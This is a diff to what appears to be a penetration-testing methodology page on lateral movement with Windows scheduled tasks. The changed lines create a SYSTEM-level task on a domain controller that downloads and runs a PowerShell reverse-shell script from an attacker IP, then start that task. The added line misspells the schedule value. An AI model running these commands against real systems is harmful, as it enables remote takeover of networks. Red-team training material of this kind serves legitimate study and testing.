@@ -15,7 +15,10 @@ schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S
 schtasks /run /tn <TASK_NAME> /S <VICTIM>
 ```
 
-```text
-schtasks /create /S dcorp-dc.my.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
+```bash
+schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
+schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
+
+More information about the [**use of schtasks with silver tickets here**](../active-directory-methodology/silver-ticket.md#host).
 
